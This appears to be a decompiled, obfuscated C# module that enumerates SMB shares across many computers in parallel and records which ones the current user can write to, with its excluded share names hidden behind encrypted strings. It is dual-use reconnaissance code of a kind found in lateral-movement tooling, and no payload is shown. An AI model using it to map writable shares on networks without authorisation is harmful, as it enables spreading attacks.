using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using _003CPrivateImplementationDetails_003E_007B18A11B1C_002D3AA7_002D4357_002DAAD9_002DCC83BB5216E3_007D;

namespace NetBIOS;

public class Shares
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct WKSTA_INFO_100
	{
		public int platform_id;

		public string computer_name;

		public string lan_group;

		public int ver_major;

		public int ver_minor;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct SHARE_INFO_0
	{
		public string shi0_netname;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct SHARE_INFO_1
	{
		public string shi1_netname;

		public uint shi1_type;

		public string shi1_remark;

		public SHARE_INFO_1(string sharename, uint sharetype, string remark)
		{
			shi1_netname = sharename;
			shi1_type = sharetype;
			shi1_remark = remark;
		}

		public override string ToString()
		{
			return shi1_netname;
		}
	}

	private enum b : uint
	{
		A = 0u,
		a = 2100u,
		B = 2116u,
		b = 2118u,
		C = 2123u
	}

	private enum C : uint
	{
		A = 0u,
		a = 1u,
		B = 2u,
		b = 3u,
		C = 2147483648u
	}

	[CompilerGenerated]
	private sealed class c
	{
		public List<string> A;
	}

	[CompilerGenerated]
	private sealed class D
	{
		public string A;

		public c A;

		internal void A()
		{
			try
			{
				List<string> computerShares = GetComputerShares(this.A, check: true);
				this.A.A.AddRange(computerShares);
			}
			catch (Exception)
			{
			}
		}
	}

	private const uint m_A = uint.MaxValue;

	private const int m_A = 0;

	public static ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();

	[DllImport("Netapi32.dll", SetLastError = true)]
	public static extern int NetWkstaGetInfo(string servername, int level, out IntPtr bufptr);

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static SHARE_INFO_1[] EnumNetShares(string Server)
	{
		List<SHARE_INFO_1> list = new List<SHARE_INFO_1>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(SHARE_INFO_1));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(Server);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				SHARE_INFO_1 item = (SHARE_INFO_1)Marshal.PtrToStructure(ptr, typeof(SHARE_INFO_1));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new SHARE_INFO_1(Class0.A() + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static List<string> GetComputerShares(string computer, bool check)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(Class0.a());
		list2.Add(Class0.B());
		if (computer != null && computer.Trim().Length > 0)
		{
			SHARE_INFO_1[] share_INFO_1_ = EnumNetShares(computer);
			if (check)
			{
				List<string> list3 = a(computer, list2, share_INFO_1_);
				if (list3.Count > 0)
				{
					list.AddRange(list3);
				}
			}
			{
				foreach (string item in A(computer, list2, share_INFO_1_))
				{
					if (!list.Contains(item))
					{
						list.Add(item);
					}
				}
				return list;
			}
		}
		return list;
	}

	private static List<string> A(string string_0, List<string> list_0, SHARE_INFO_1[] share_INFO_1_0)
	{
		List<string> list = new List<string>();
		for (int i = 0; i < share_INFO_1_0.Length; i++)
		{
			SHARE_INFO_1 sHARE_INFO_ = share_INFO_1_0[i];
			if (!list_0.Contains(sHARE_INFO_.shi1_netname))
			{
				try
				{
					string text = string.Format(Class0.b(), string_0, sHARE_INFO_.shi1_netname);
					Directory.GetFiles(text);
					list.Add(text);
				}
				catch (Exception)
				{
				}
			}
		}
		return list;
	}

	private static List<string> a(string string_0, List<string> list_0, SHARE_INFO_1[] share_INFO_1_0)
	{
		List<string> list = new List<string>();
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		string value = current.User!.Value;
		for (int i = 0; i < share_INFO_1_0.Length; i++)
		{
			SHARE_INFO_1 sHARE_INFO_ = share_INFO_1_0[i];
			if (list_0.Contains(sHARE_INFO_.shi1_netname))
			{
				continue;
			}
			try
			{
				string text = string.Format(Class0.b(), string_0, sHARE_INFO_.shi1_netname);
				Directory.GetFiles(text);
				AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
				foreach (FileSystemAccessRule item in accessRules)
				{
					if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
					{
						list.Add(sHARE_INFO_.shi1_netname);
						break;
					}
				}
			}
			catch
			{
			}
		}
		return list;
	}

	public static void WriteToFileThreadSafe(string text, string path)
	{
		_readWriteLock.EnterWriteLock();
		try
		{
			using StreamWriter streamWriter = File.AppendText(path);
			streamWriter.WriteLine(text);
			streamWriter.Close();
		}
		finally
		{
			_readWriteLock.ExitWriteLock();
		}
	}

	public static void GetAllShares(List<string> computers, List<string> accumulator)
	{
		List<Action> list = new List<Action>();
		foreach (string A in computers)
		{
			list.Add(delegate
			{
				try
				{
					List<string> computerShares = GetComputerShares(A, check: true);
					accumulator.AddRange(computerShares);
				}
				catch (Exception)
				{
				}
			});
		}
		ParallelOptions parallelOptions = new ParallelOptions
		{
			MaxDegreeOfParallelism = Environment.ProcessorCount * 2
		};
		Parallel.Invoke(parallelOptions, list.ToArray());
	}
}
